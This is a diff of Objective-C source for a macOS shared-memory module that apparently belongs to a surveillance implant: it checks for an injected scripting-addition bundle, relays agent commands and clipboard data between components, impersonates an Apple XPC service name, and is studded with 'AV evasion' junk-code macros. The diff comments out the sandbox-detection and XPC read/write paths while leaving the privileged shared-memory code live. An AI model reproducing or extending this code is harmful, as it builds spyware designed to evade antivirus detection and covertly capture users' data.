@@ -43,132 +43,132 @@
 static time_t testPreviousTime = 0;
 
 // function pointers for dinamic linking on 10.7
-static BOOL (*_sandbox_check)(pid_t pid, int type, int operation) = NULL;
+//static BOOL (*_sandbox_check)(pid_t pid, int type, int operation) = NULL;
 
-static const struct _xpc_type_s *__xpc_type_dictionary;
-static const struct _xpc_type_s *__xpc_type_error;
-static struct _xpc_dictionary_s *__xpc_error_connection_interrupted;
-static struct _xpc_dictionary_s *__xpc_error_connection_invalid;
-
-static xpc_object_t (*_xpc_dictionary_create)(const char **, const xpc_object_t *, size_t) = NULL;
-static xpc_object_t (*_xpc_int64_create)(uint64_t) = NULL;
-static xpc_object_t (*_xpc_data_create)(const void *, size_t) = NULL;
-
-static const void *(*_xpc_dictionary_get_data)(xpc_object_t, const char *, size_t *) = NULL;
-static void (*_xpc_dictionary_set_value)(xpc_object_t , const char *, xpc_object_t) = NULL;
-
-static xpc_type_t (*_xpc_get_type)(xpc_object_t) = NULL;
-
-static xpc_connection_t (*_xpc_connection_create)(const char *, dispatch_queue_t) = NULL;
-static void (*_xpc_connection_resume)(xpc_connection_t) = NULL;
-static void (*_xpc_connection_set_event_handler)(xpc_connection_t, xpc_handler_t) = NULL;
-static void (*_xpc_connection_send_message_with_reply)(xpc_connection_t, 
-                                                       xpc_object_t, 
-                                                       dispatch_queue_t, 
-                                                       xpc_handler_t) = NULL;
-static xpc_object_t (*_xpc_connection_send_message_with_reply_sync)(xpc_connection_t, xpc_object_t);
-static void (*_xpc_release)(xpc_object_t) = NULL;
+//static const struct _xpc_type_s *__xpc_type_dictionary;
+//static const struct _xpc_type_s *__xpc_type_error;
+//static struct _xpc_dictionary_s *__xpc_error_connection_interrupted;
+//static struct _xpc_dictionary_s *__xpc_error_connection_invalid;
+//
+//static xpc_object_t (*_xpc_dictionary_create)(const char **, const xpc_object_t *, size_t) = NULL;
+//static xpc_object_t (*_xpc_int64_create)(uint64_t) = NULL;
+//static xpc_object_t (*_xpc_data_create)(const void *, size_t) = NULL;
+//
+//static const void *(*_xpc_dictionary_get_data)(xpc_object_t, const char *, size_t *) = NULL;
+//static void (*_xpc_dictionary_set_value)(xpc_object_t , const char *, xpc_object_t) = NULL;
+//
+//static xpc_type_t (*_xpc_get_type)(xpc_object_t) = NULL;
+//
+//static xpc_connection_t (*_xpc_connection_create)(const char *, dispatch_queue_t) = NULL;
+//static void (*_xpc_connection_resume)(xpc_connection_t) = NULL;
+//static void (*_xpc_connection_set_event_handler)(xpc_connection_t, xpc_handler_t) = NULL;
+//static void (*_xpc_connection_send_message_with_reply)(xpc_connection_t, 
+//                                                       xpc_object_t, 
+//                                                       dispatch_queue_t, 
+//                                                       xpc_handler_t) = NULL;
+//static xpc_object_t (*_xpc_connection_send_message_with_reply_sync)(xpc_connection_t, xpc_object_t);
+//static void (*_xpc_release)(xpc_object_t) = NULL;
 //
 
 // Building on sdk < 10.7 
-static BOOL resolveXpcFunc()
-{
-  void *libsystem = dlopen("/usr/lib/libSystem.dylib", RTLD_NOW);
+//static BOOL resolveXpcFunc()
+//{
+//  void *libsystem = dlopen("/usr/lib/libSystem.dylib", RTLD_NOW);
+//
+//  if (libsystem == NULL) 
+//    {
+//#ifdef DEBUG_SHMEM
+//      infoLog(@"error on loading library libSystem");
+//#endif
+//      return NO;
+//    }
+//
+//  __xpc_type_error = dlsym(libsystem, "_xpc_type_error");
+//  __xpc_type_dictionary = dlsym(libsystem, "_xpc_type_dictionary");
+//  __xpc_error_connection_invalid = dlsym(libsystem, "_xpc_error_connection_invalid");
+//  __xpc_error_connection_interrupted = dlsym(libsystem, "_xpc_error_connection_interrupted");
+//
+//  _xpc_dictionary_create = dlsym(libsystem, "xpc_dictionary_create");
+//  _xpc_int64_create = dlsym(libsystem, "xpc_int64_create");
+//  _xpc_data_create = dlsym(libsystem, "xpc_data_create");
+//
+//  _xpc_dictionary_get_data = dlsym(libsystem, "xpc_dictionary_get_data");
+//  _xpc_dictionary_set_value = dlsym(libsystem, "xpc_dictionary_set_value");
+//  _xpc_get_type = dlsym(libsystem, "xpc_get_type");
+//
+//  _xpc_connection_create = dlsym(libsystem, "xpc_connection_create");
+//  _xpc_connection_resume = dlsym(libsystem, "xpc_connection_resume");
+//  _xpc_connection_set_event_handler = dlsym(libsystem, "xpc_connection_set_event_handler");
+//  _xpc_connection_send_message_with_reply = dlsym(libsystem, "xpc_connection_send_message_with_reply");
+//  _xpc_connection_send_message_with_reply_sync = dlsym(libsystem, "xpc_connection_send_message_with_reply_sync");
+//  _xpc_release = dlsym(libsystem, "xpc_release");
+//
+//  if (_xpc_dictionary_create == NULL ||
+//      _xpc_int64_create == NULL ||
+//      _xpc_data_create == NULL ||
+//      _xpc_dictionary_get_data == NULL ||
+//      _xpc_dictionary_set_value == NULL ||
+//      _xpc_get_type == NULL ||
+//      _xpc_connection_create == NULL ||
+//      _xpc_connection_set_event_handler == NULL ||
+//      _xpc_connection_send_message_with_reply == NULL ||
+//      _xpc_connection_send_message_with_reply_sync == NULL ||
+//      _xpc_release == NULL) 
+//    {
+//#ifdef DEBUG_SHMEM
+//      infoLog(@"error resolving xpc sym");
+//#endif
+//      return NO;
+//    }
+//
+//  void *sndbox = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
+//
+//  if (sndbox != NULL) 
+//    _sandbox_check = dlsym(sndbox, "sandbox_check");
+//
+//  if (_sandbox_check == NULL)
+//    {
+//#ifdef DEBUG_SHMEM
+//      infoLog(@"error resolving sndbox_check sym");
+//#endif
+//      return NO;
+//    }
+//
+//  return YES;
+//}
 
-  if (libsystem == NULL) 
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"error on loading library libSystem");
-#endif
-      return NO;
-    }
-
-  __xpc_type_error = dlsym(libsystem, "_xpc_type_error");
-  __xpc_type_dictionary = dlsym(libsystem, "_xpc_type_dictionary");
-  __xpc_error_connection_invalid = dlsym(libsystem, "_xpc_error_connection_invalid");
-  __xpc_error_connection_interrupted = dlsym(libsystem, "_xpc_error_connection_interrupted");
-
-  _xpc_dictionary_create = dlsym(libsystem, "xpc_dictionary_create");
-  _xpc_int64_create = dlsym(libsystem, "xpc_int64_create");
-  _xpc_data_create = dlsym(libsystem, "xpc_data_create");
-
-  _xpc_dictionary_get_data = dlsym(libsystem, "xpc_dictionary_get_data");
-  _xpc_dictionary_set_value = dlsym(libsystem, "xpc_dictionary_set_value");
-  _xpc_get_type = dlsym(libsystem, "xpc_get_type");
-
-  _xpc_connection_create = dlsym(libsystem, "xpc_connection_create");
-  _xpc_connection_resume = dlsym(libsystem, "xpc_connection_resume");
-  _xpc_connection_set_event_handler = dlsym(libsystem, "xpc_connection_set_event_handler");
-  _xpc_connection_send_message_with_reply = dlsym(libsystem, "xpc_connection_send_message_with_reply");
-  _xpc_connection_send_message_with_reply_sync = dlsym(libsystem, "xpc_connection_send_message_with_reply_sync");
-  _xpc_release = dlsym(libsystem, "xpc_release");
-
-  if (_xpc_dictionary_create == NULL ||
-      _xpc_int64_create == NULL ||
-      _xpc_data_create == NULL ||
-      _xpc_dictionary_get_data == NULL ||
-      _xpc_dictionary_set_value == NULL ||
-      _xpc_get_type == NULL ||
-      _xpc_connection_create == NULL ||
-      _xpc_connection_set_event_handler == NULL ||
-      _xpc_connection_send_message_with_reply == NULL ||
-      _xpc_connection_send_message_with_reply_sync == NULL ||
-      _xpc_release == NULL) 
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"error resolving xpc sym");
-#endif
-      return NO;
-    }
-
-  void *sndbox = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
-
-  if (sndbox != NULL) 
-    _sandbox_check = dlsym(sndbox, "sandbox_check");
-
-  if (_sandbox_check == NULL)
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"error resolving sndbox_check sym");
-#endif
-      return NO;
-    }
-
-  return YES;
-}
-
-static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
-{
-  BOOL bRet = FALSE;
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  if (resolveXpcFunc() == NO) 
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"error resolving xpc function addresses");
-#endif
-      return bRet;
-    }
-  else
-    {
-#ifdef  DEBUG_SHMEM
-      infoLog(@" xpc function resolved");
-#endif
-    }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_004
-  
-  bRet = _sandbox_check(pid, operation, type);
-
-#ifdef  DEBUG_SHMEM
-  infoLog(@"Application sanboxed %d", bRet);
-#endif
-
-  return bRet;
-}
+//static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
+//{
+//  BOOL bRet = FALSE;
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_001
+//  
+//  if (resolveXpcFunc() == NO) 
+//    {
+//#ifdef DEBUG_SHMEM
+//      infoLog(@"error resolving xpc function addresses");
+//#endif
+//      return bRet;
+//    }
+//  else
+//    {
+//#ifdef  DEBUG_SHMEM
+//      infoLog(@" xpc function resolved");
+//#endif
+//    }
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_004
+//  
+//  bRet = _sandbox_check(pid, operation, type);
+//
+//#ifdef  DEBUG_SHMEM
+//  infoLog(@"Application sanboxed %d", bRet);
+//#endif
+//
+//  return bRet;
+//}
 
 static BOOL amIPrivileged()
 {
@@ -189,7 +189,7 @@ static BOOL amIPrivileged()
       // AV evasion: only on release build
       AV_GARBAGE_003
       
-      NSString *appleHID = [[NSString alloc] initWithFormat: @"/Library/ScriptingAdditions/%@", EXT_BUNDLE_FOLDER];
+      NSString *appleHID = [[NSString alloc] initWithFormat: @"/%@/%@/%@", LIBRARY_NSSTRING, OSAX_FOLDER, OSAX_NAME];
 
       bRet = [[NSFileManager defaultManager] fileExistsAtPath: appleHID];
       
@@ -218,7 +218,7 @@ static BOOL amIPrivileged()
       mKey           = aKey;
       mSize          = aSize;
       mSemaphoreName = [aSemaphoreName copy];
-      amISandboxed   = sandbox_compatibility(getpid(),0 ,0);
+//      amISandboxed   = sandbox_compatibility(getpid(),0 ,0);
       mAmIPrivUser   = amIPrivileged();
     }
   
@@ -260,43 +260,43 @@ static BOOL amIPrivileged()
   }
 }
 
-- (char *)_guessXPCServiceName: (NSString*)aPath
-{
-  char *retString = NULL;
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_003
-  
-  NSFileManager *localFileManager = [NSFileManager defaultManager];
-  NSDirectoryEnumerator *dirEnum  = [localFileManager enumeratorAtPath: aPath];
-  
-  NSString *_file;
-  
-  while (_file = [dirEnum nextObject]) 
-    {
-      if ([_file hasPrefix: XPC_BUNDLE_FOLDER_PREFIX]) 
-        {
-#ifdef DEBUG_SHMEM
-          //infoLog(@"%s: found xpc service with name %@", __FUNCTION__, _file);
-#endif
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_002
-          
-          retString = (char*)[_file UTF8String];
-
-          retString[strlen(retString) - 4] = 0;
-
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_001
-          
-          return retString;
-        }
-    }
-  
-  return retString;
-}
+//- (char *)_guessXPCServiceName: (NSString*)aPath
+//{
+//  char *retString = NULL;
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_003
+//  
+//  NSFileManager *localFileManager = [NSFileManager defaultManager];
+//  NSDirectoryEnumerator *dirEnum  = [localFileManager enumeratorAtPath: aPath];
+//  
+//  NSString *_file;
+//  
+//  while (_file = [dirEnum nextObject]) 
+//    {
+//      if ([_file hasPrefix: XPC_BUNDLE_FOLDER_PREFIX]) 
+//        {
+//#ifdef DEBUG_SHMEM
+//          //infoLog(@"%s: found xpc service with name %@", __FUNCTION__, _file);
+//#endif
+//          
+//          // AV evasion: only on release build
+//          AV_GARBAGE_002
+//          
+//          retString = (char*)[_file UTF8String];
+//
+//          retString[strlen(retString) - 4] = 0;
+//
+//          
+//          // AV evasion: only on release build
+//          AV_GARBAGE_001
+//          
+//          return retString;
+//        }
+//    }
+//  
+//  return retString;
+//}
 
 - (void)zeroFillMemory
 {
@@ -312,8 +312,8 @@ static BOOL amIPrivileged()
   AV_GARBAGE_003
   
   // if sanboxed do nothing...
-  if (amISandboxed)
-    return 0;
+//  if (amISandboxed)
+//    return 0;
   if (mAmIPrivUser)
   {  
     // AV evasion: only on release build
@@ -367,8 +367,8 @@ static BOOL amIPrivileged()
   AV_GARBAGE_003
   
   // If sandboxed to nothing...
-  if (amISandboxed == NO) 
-  { 
+//  if (amISandboxed == NO) 
+//  { 
     if (mAmIPrivUser)
     {  
       // AV evasion: only on release build
@@ -410,7 +410,7 @@ static BOOL amIPrivileged()
       {
         return -1;
       }
-    }
+//    }
     
 #ifdef DEBUG_SHMEM
     infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
@@ -455,51 +455,51 @@ static BOOL amIPrivileged()
   AV_GARBAGE_001
   
   // If sandboxed read shmem by xpc service
-  if (amISandboxed) 
-  {
-    char *service_name = "com.apple.mdworker_server";
-    //[self _guessXPCServiceName: XPC_BUNDLE_FRAMEWORK_PATH];
-    
-    if (service_name == NULL) 
-    {
-#ifdef  DEBUG_SHMEM
-      //infoLog(@"%s: error getting service name", __FUNCTION__);
-#endif
-      return -1;
-    }
-    else
-    {
-#ifdef  DEBUG_SHMEM
-      //infoLog(@"%s: setting service name %s", __FUNCTION__, service_name);
-#endif
-    }
-    
-    // AV evasion: only on release build
-    AV_GARBAGE_003
-    
-    xpc_handler_t handler = (^(xpc_object_t event) 
-                             {
-                               xpc_type_t type = _xpc_get_type(event);
-                               
-                               if (type == __xpc_type_error) 
-                               {
-#ifdef DEBUG_SHMEM
-                                 //infoLog(@"error cannot continue!");
-#endif
-                               }
-                             });
-    
-    // AV evasion: only on release build
-    AV_GARBAGE_001
-    
-    mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
-    
-    _xpc_connection_set_event_handler(mXpcCon, handler);
-    
-    _xpc_connection_resume(mXpcCon);
-    
-    return 0;  
-  }
+//  if (amISandboxed) 
+//  {
+//    char *service_name = "com.apple.mdworker_server";
+//    //[self _guessXPCServiceName: XPC_BUNDLE_FRAMEWORK_PATH];
+//    
+//    if (service_name == NULL) 
+//    {
+//#ifdef  DEBUG_SHMEM
+//      //infoLog(@"%s: error getting service name", __FUNCTION__);
+//#endif
+//      return -1;
+//    }
+//    else
+//    {
+//#ifdef  DEBUG_SHMEM
+//      //infoLog(@"%s: setting service name %s", __FUNCTION__, service_name);
+//#endif
+//    }
+//    
+//    // AV evasion: only on release build
+//    AV_GARBAGE_003
+//    
+//    xpc_handler_t handler = (^(xpc_object_t event) 
+//                             {
+//                               xpc_type_t type = _xpc_get_type(event);
+//                               
+//                               if (type == __xpc_type_error) 
+//                               {
+//#ifdef DEBUG_SHMEM
+//                                 //infoLog(@"error cannot continue!");
+//#endif
+//                               }
+//                             });
+//    
+//    // AV evasion: only on release build
+//    AV_GARBAGE_001
+//    
+//    mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
+//    
+//    _xpc_connection_set_event_handler(mXpcCon, handler);
+//    
+//    _xpc_connection_resume(mXpcCon);
+//    
+//    return 0;  
+//  }
   
   // AV evasion: only on release build
   AV_GARBAGE_009
@@ -590,8 +590,8 @@ static BOOL amIPrivileged()
   // AV evasion: only on release build
   AV_GARBAGE_003
   
-  if (amISandboxed)
-    return TRUE;
+//  if (amISandboxed)
+//    return TRUE;
   
   if (mSize < mSize)
     {
@@ -642,262 +642,262 @@ static BOOL amIPrivileged()
       return;
 }
 
-- (BOOL)writeMemorybyXPC: (NSData *)aData
-                  offset: (u_int)anOffset
-           fromComponent: (u_int)aComponent
-{  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  xpc_object_t reply;
-  BOOL bRet = FALSE;
-  
-  if (aData == nil || 
-      [aData length] == 0)
-  {
-#ifdef DEBUG_SHMEM
-    infoLog(@"[XPC __m_MSharedMemory] write memory with aData = nil");
-#endif
-    return bRet;
-  }
-  else
-  {
-#ifdef DEBUG_SHMEM
-    infoLog(@"[XPC __m_MSharedMemory] writeMemorybyXPC....");
-#endif
-  }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_006
-  
-  // Write command
-  xpc_object_t cmd  = _xpc_int64_create(WRITE_XPC_CMD);
-  xpc_object_t off  = _xpc_int64_create(anOffset);
-  xpc_object_t cmp  = _xpc_int64_create(aComponent);
-  xpc_object_t data = _xpc_data_create([aData bytes], [aData length]);
-  
-  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
-  
-  _xpc_dictionary_set_value(message, "command", cmd);
-  _xpc_dictionary_set_value(message, "offset", off);
-  _xpc_dictionary_set_value(message, "component", cmp);
-  _xpc_dictionary_set_value(message, "data", data);
-  
-  reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_003
-  
-  if (reply != NULL) 
-  {
-    xpc_type_t type = _xpc_get_type(reply);
-    
-    if (type == __xpc_type_error) 
-    {
-      if (reply == __xpc_error_connection_interrupted) 
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@"xpc error connection interrupted");
-#endif
-      } 
-      else if (reply == __xpc_error_connection_invalid) 
-      {            
-#ifdef DEBUG_SHMEM
-        infoLog(@"xpc error connection invalid");
-#endif
-      }
-    } 
-    else if (type == __xpc_type_dictionary) 
-    { 
-      unsigned long len = 0;
-      char *buff = NULL;
-      
-      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-      
-      if (buff == NULL || len == 0)
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@"xpc error getting raw data");
-#endif
-      }
-      else
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@"xpc getting raw data len %lu", len);
-#endif
-        memcpy(&bRet, buff, sizeof(bRet));
-      }
-    }
-  }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_006
-  
-  _xpc_release(message);
-  
-  return bRet;
-}
+//- (BOOL)writeMemorybyXPC: (NSData *)aData
+//                  offset: (u_int)anOffset
+//           fromComponent: (u_int)aComponent
+//{  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_001
+//  
+//  xpc_object_t reply;
+//  BOOL bRet = FALSE;
+//  
+//  if (aData == nil || 
+//      [aData length] == 0)
+//  {
+//#ifdef DEBUG_SHMEM
+//    infoLog(@"[XPC __m_MSharedMemory] write memory with aData = nil");
+//#endif
+//    return bRet;
+//  }
+//  else
+//  {
+//#ifdef DEBUG_SHMEM
+//    infoLog(@"[XPC __m_MSharedMemory] writeMemorybyXPC....");
+//#endif
+//  }
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_006
+//  
+//  // Write command
+//  xpc_object_t cmd  = _xpc_int64_create(WRITE_XPC_CMD);
+//  xpc_object_t off  = _xpc_int64_create(anOffset);
+//  xpc_object_t cmp  = _xpc_int64_create(aComponent);
+//  xpc_object_t data = _xpc_data_create([aData bytes], [aData length]);
+//  
+//  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
+//  
+//  _xpc_dictionary_set_value(message, "command", cmd);
+//  _xpc_dictionary_set_value(message, "offset", off);
+//  _xpc_dictionary_set_value(message, "component", cmp);
+//  _xpc_dictionary_set_value(message, "data", data);
+//  
+//  reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_003
+//  
+//  if (reply != NULL) 
+//  {
+//    xpc_type_t type = _xpc_get_type(reply);
+//    
+//    if (type == __xpc_type_error) 
+//    {
+//      if (reply == __xpc_error_connection_interrupted) 
+//      {
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"xpc error connection interrupted");
+//#endif
+//      } 
+//      else if (reply == __xpc_error_connection_invalid) 
+//      {            
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"xpc error connection invalid");
+//#endif
+//      }
+//    } 
+//    else if (type == __xpc_type_dictionary) 
+//    { 
+//      unsigned long len = 0;
+//      char *buff = NULL;
+//      
+//      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+//      
+//      if (buff == NULL || len == 0)
+//      {
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"xpc error getting raw data");
+//#endif
+//      }
+//      else
+//      {
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"xpc getting raw data len %lu", len);
+//#endif
+//        memcpy(&bRet, buff, sizeof(bRet));
+//      }
+//    }
+//  }
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_006
+//  
+//  _xpc_release(message);
+//  
+//  return bRet;
+//}
 
-- (NSMutableData*)readMemoryByXPC:(u_int)anOffset 
-                    fromComponent:(u_int)aComponent
-{
-  NSMutableData *xpcReplyData = nil;
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  // reading command
-  xpc_object_t cmd = _xpc_int64_create(READ_XPC_CMD);
-  xpc_object_t off = _xpc_int64_create(anOffset);
-  xpc_object_t cmp = _xpc_int64_create(aComponent);
-  
-  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
-  
-  _xpc_dictionary_set_value(message, "command", cmd);
-  _xpc_dictionary_set_value(message, "offset", off);
-  _xpc_dictionary_set_value(message, "component", cmp);
-  
-  // blocking send message
-  xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_008
-  
-  if (reply != NULL)
-  {
-    xpc_type_t type = _xpc_get_type(reply);
-    
-    if (type == __xpc_type_error) 
-    {
-      if (reply == __xpc_error_connection_interrupted) 
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
-#endif
-      } 
-      else if (reply == __xpc_error_connection_invalid) 
-      {            
-#ifdef DEBUG_SHMEM
-        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
-#endif
-      }
-    } 
-    else if (type == __xpc_type_dictionary) 
-    { 
-      unsigned long len;
-      char *buff;
-      
-      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-      
-      if (buff == NULL)
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
-#endif
-      }
-      else
-      {
-        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
-                                                     length:len];
-#ifdef DEBUG_SHMEM
-        if (anOffset == OFFT_CLIPBOARD)
-        {
-          infoLog(@"[XPC __m_MSharedMemory] read memory at off %#x", anOffset);
-          
-          shMemoryCommand *cmd = (shMemoryCommand*)buff;
-          
-          infoLog(@"[XPC __m_MSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
-        }
-#endif
-      }
-    }
-  }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_007
-  
-  _xpc_release(message);
-  
-  return xpcReplyData;
-}
+//- (NSMutableData*)readMemoryByXPC:(u_int)anOffset 
+//                    fromComponent:(u_int)aComponent
+//{
+//  NSMutableData *xpcReplyData = nil;
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_001
+//  
+//  // reading command
+//  xpc_object_t cmd = _xpc_int64_create(READ_XPC_CMD);
+//  xpc_object_t off = _xpc_int64_create(anOffset);
+//  xpc_object_t cmp = _xpc_int64_create(aComponent);
+//  
+//  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
+//  
+//  _xpc_dictionary_set_value(message, "command", cmd);
+//  _xpc_dictionary_set_value(message, "offset", off);
+//  _xpc_dictionary_set_value(message, "component", cmp);
+//  
+//  // blocking send message
+//  xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_008
+//  
+//  if (reply != NULL)
+//  {
+//    xpc_type_t type = _xpc_get_type(reply);
+//    
+//    if (type == __xpc_type_error) 
+//    {
+//      if (reply == __xpc_error_connection_interrupted) 
+//      {
+//#ifdef DEBUG_SHMEM
+//        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
+//#endif
+//      } 
+//      else if (reply == __xpc_error_connection_invalid) 
+//      {            
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
+//#endif
+//      }
+//    } 
+//    else if (type == __xpc_type_dictionary) 
+//    { 
+//      unsigned long len;
+//      char *buff;
+//      
+//      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+//      
+//      if (buff == NULL)
+//      {
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
+//#endif
+//      }
+//      else
+//      {
+//        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
+//                                                     length:len];
+//#ifdef DEBUG_SHMEM
+//        if (anOffset == OFFT_CLIPBOARD)
+//        {
+//          infoLog(@"[XPC __m_MSharedMemory] read memory at off %#x", anOffset);
+//          
+//          shMemoryCommand *cmd = (shMemoryCommand*)buff;
+//          
+//          infoLog(@"[XPC __m_MSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
+//        }
+//#endif
+//      }
+//    }
+//  }
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_007
+//  
+//  _xpc_release(message);
+//  
+//  return xpcReplyData;
+//}
 
-- (NSMutableData *)readMemoryByXPCFromComponent: (u_int)aComponent
-                                       forAgent: (u_int)anAgentID
-                                withCommandType: (u_int)aCommandType
-
-{
-  NSMutableData *xpcReplyData = nil;
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  // reading command
-  xpc_object_t cmd = _xpc_int64_create(READ_XPC_COMP_CMD);
-  xpc_object_t cmp = _xpc_int64_create(aComponent);
-  xpc_object_t agt = _xpc_int64_create(anAgentID);
-  xpc_object_t typ = _xpc_int64_create(aCommandType);
-  
-  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
-  
-  _xpc_dictionary_set_value(message, "command", cmd);
-  _xpc_dictionary_set_value(message, "component", cmp);
-  _xpc_dictionary_set_value(message, "agent", agt);
-  _xpc_dictionary_set_value(message, "type", typ);
-  
-  
-  // blocking send message
-  xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_004
-  
-  if (reply != NULL)
-  {
-    xpc_type_t type = _xpc_get_type(reply);
-    
-    if (type == __xpc_type_error) 
-    {
-      if (reply == __xpc_error_connection_interrupted) 
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
-#endif
-      } 
-      else if (reply == __xpc_error_connection_invalid) 
-      {            
-#ifdef DEBUG_SHMEM
-        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
-#endif
-      }
-    } 
-    else if (type == __xpc_type_dictionary) 
-    { 
-      unsigned long len;
-      char *buff;
-      
-      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-      
-      if (buff == NULL)
-      {
-#ifdef DEBUG_SHMEM
-        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
-#endif
-      }
-      else
-      {
-        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
-                                                     length:len];
-      }
-    }
-  }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_008
-  
-  _xpc_release(message);
-  
-  return xpcReplyData;
-}
+//- (NSMutableData *)readMemoryByXPCFromComponent: (u_int)aComponent
+//                                       forAgent: (u_int)anAgentID
+//                                withCommandType: (u_int)aCommandType
+//
+//{
+//  NSMutableData *xpcReplyData = nil;
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_001
+//  
+//  // reading command
+//  xpc_object_t cmd = _xpc_int64_create(READ_XPC_COMP_CMD);
+//  xpc_object_t cmp = _xpc_int64_create(aComponent);
+//  xpc_object_t agt = _xpc_int64_create(anAgentID);
+//  xpc_object_t typ = _xpc_int64_create(aCommandType);
+//  
+//  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
+//  
+//  _xpc_dictionary_set_value(message, "command", cmd);
+//  _xpc_dictionary_set_value(message, "component", cmp);
+//  _xpc_dictionary_set_value(message, "agent", agt);
+//  _xpc_dictionary_set_value(message, "type", typ);
+//  
+//  
+//  // blocking send message
+//  xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_004
+//  
+//  if (reply != NULL)
+//  {
+//    xpc_type_t type = _xpc_get_type(reply);
+//    
+//    if (type == __xpc_type_error) 
+//    {
+//      if (reply == __xpc_error_connection_interrupted) 
+//      {
+//#ifdef DEBUG_SHMEM
+//        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
+//#endif
+//      } 
+//      else if (reply == __xpc_error_connection_invalid) 
+//      {            
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
+//#endif
+//      }
+//    } 
+//    else if (type == __xpc_type_dictionary) 
+//    { 
+//      unsigned long len;
+//      char *buff;
+//      
+//      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+//      
+//      if (buff == NULL)
+//      {
+//#ifdef DEBUG_SHMEM
+//        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
+//#endif
+//      }
+//      else
+//      {
+//        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
+//                                                     length:len];
+//      }
+//    }
+//  }
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_008
+//  
+//  _xpc_release(message);
+//  
+//  return xpcReplyData;
+//}
 
 - (NSMutableData *)readMemoryFromComponent: (u_int)aComponent
                                   forAgent: (u_int)anAgentID
@@ -910,14 +910,14 @@ static BOOL amIPrivileged()
   shMemoryLog *tempHeader = NULL;
   
